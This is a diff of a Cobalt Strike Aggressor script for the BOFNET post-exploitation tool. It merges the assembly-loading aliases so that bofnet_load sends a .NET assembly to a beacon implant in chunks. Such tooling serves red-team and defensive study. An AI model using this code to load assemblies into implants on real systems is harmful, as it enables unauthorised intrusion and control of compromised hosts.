@@ -122,19 +122,7 @@ alias bofnet_execute {
 	beacon_inline_execute($1, $bofnetNative, "go", $2.$bofArguments);
 }
 
-alias bofnet_load {
-    $bofnetNative = loadBOFNativeRuntime($1);
-    if($bofnetNative != $null){
-        return;
-    }
-
-    $assemblyData = readAllFileData($2);
-	btask($1, "Attempting to load .NET assembly $2 into BOFNET");
-	beacon_inline_execute($1, $bofnetNative, "go", "BOFNET.Bofs.AssemblyLoader\x00".$assemblyData);
-}
-
-
-alias bofnet_loadbig{
+alias bofnet_load{
 
     local('$assemblyData');
 
@@ -157,13 +145,13 @@ alias bofnet_loadbig{
     for($i = 0; $i < $numChunks; $i++){ 
         $chunk = substr($rawData, $i * $chunkSize, ($i * $chunkSize) + $chunkSize);
         $assemblyData = bof_pack($1, "Zib", $id , $chunkSize, $chunk) ;
-        bofnet_execute_raw($1, "BOFNET.Bofs.AssemblyLoaderBig", $assemblyData);
+        bofnet_execute_raw($1, "BOFNET.Bofs.AssemblyLoader", $assemblyData);
     }
 
     if($remainder > 0){
         $chunk = substr($rawData, $numChunks * $chunkSize, ($numChunks * $chunkSize) + $remainder + 1);
         $assemblyData = bof_pack($1, "Zib", $id , $chunkSize, $chunk) ;
-        bofnet_execute_raw($1, "BOFNET.Bofs.AssemblyLoaderBig", $assemblyData);        
+        bofnet_execute_raw($1, "BOFNET.Bofs.AssemblyLoader", $assemblyData);        
     }
 }
 
